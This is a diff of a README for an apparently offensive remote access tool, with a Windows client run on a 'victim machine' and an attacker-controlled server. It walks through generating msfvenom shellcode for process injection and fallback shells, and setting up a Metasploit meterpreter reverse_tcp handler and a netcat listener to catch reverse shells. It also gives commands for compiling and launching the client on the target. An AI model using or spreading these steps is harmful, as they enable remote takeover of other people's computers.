@@ -2,52 +2,47 @@
 
 After cloning the whole project and getting inside of the x64 folder:
 
-1. Open Client.c and replace the contents of the variable ServerIP at line 30 with the IP address of the attacker machine
+1. If you want to be able to use inject64, startcat and the fallback shell, open Client.c and execute the commented msfvenom commands at lines: 63, 64 and 65. (Replace the LHOST/LPORT according to your needs), and then replace the contents of the variables ShellcodeX64, ShellcodeSpawnNetcat, and FallBackShell at lines 67, 70 and 73 with the output of each command. If you also want to abilitate the fallback shell, you must set the variable UseFallBackShell (line 32), to 1.
 
-2. From the terminal, generate the shellcode for ShellcodeX64 using the first commented msfvenom command (Replace the LHOST variable with the IP address of the attacker machine)
-
-3. Now Generate the respective shellcodes for ShellcodeSpawnNetcat and FallBackShell using the last 2 commented msfvenom commands (Replace the LHOST variable just like you did before (2.) )
-
-4. Copy the output from msfvenom for ShellcodeSpawnNetcat and FallBackShell, and paste it inside of ESH.c
-
-5. Compile and execute ESH.c
+2. You can generate a new certificate to use if you want (a default one was already provided for ease of use). If you generate a new certificate using Setup.sh, you must copy the contents of public.crt, into the variable 'ServerPublicCertPem' in Client.c:
 ```bash
-gcc ESH.c -o esh && ./esh
+cd ..
+./Setup.sh cert
 ```
 
-6. Grab the output of esh, and replace ShellcodeSpawnNetcat and FallBackShell inside of the Client.c file and save.
-
-7. Open Server.c and replace the contents at line 14 with the IP address of the attacker machine and save.
-
-8. You should now be good to go, compile everything by typing:
+3. You can now compile. Type:
 ```bash
-x86_64-w64-mingw32-gcc -o Client.exe Client.c -lwsock32 -lwininet -lgdi32 -lntdll && gcc Server.c -o Server -lpthread && echo "Compilation Successful"
+./Setup.sh compile
 ```
 
-9. If everything went correctly, the string "Compilation Successful" should popup in your terminal. If not, there was an error when trying to compile. Make sure you did everything correctly.
+4. If everything went correctly, you should now have 4 executables: 2 clients (x64 and x86), and 2 server executables (x64 and x86). If not, there was an error when trying to compile. Make sure you did everything correctly.
 
-10. Setting the server: Before executing the Client on the victim machine, you must make sure to open another tab in your terminal (On the attacker machine), and execute the following command:
+5. You can now provide the IP address of the server from both client and server, by passing an argument:
 ```bash
-nc -lvnp 38524
+Server:
+	./Server-x64 start 192.168.1.1
+
+Client (On target):
+	Client-x64.exe 192.168.1.1
 ```
 
-If you don't do this, when executing Client.exe, no reverse shell will be received due to the fact that you weren't listening on port 38524, and Client.exe will crash (The same thing will happen if you decide to send 'startcat' before listening for a connection on port 443)
-
-11. Now you should start the main server by typing:
-```bash
-./Server start
-```
-
-12. Before using 'inject64', open a new terminal tab, load msfconsole, and paste the lines below:
+6. Before using 'inject64', open a new terminal tab, load msfconsole, and paste the lines below:
 ```bash
 use exploit/multi/handler
-set LHOST SERVER-IP
-set LPORT 4444
+set LHOST IP
+set LPORT PORT
 set payload windows/x64/meterpreter/reverse_tcp
 run
 ```
 
-Everything should now be ready. Start the server, the client, and enjoy :)
+7. If you will be using the fallback shell: Before executing the client on the victim machine, you must make sure to open another tab in your terminal (On the attacker machine), and execute the following command:
+```bash
+nc -lvnp 38524
+```
+
+If you don't do this, when executing Client-x64.exe, no reverse shell will be received due to the fact that you weren't listening on port 38524, and Client-x64.exe will crash (the same thing will happen if you decide to send 'startcat' before listening for a connection on port 443)
+
+8. All done. Enjoy!
 
 # Commands
 
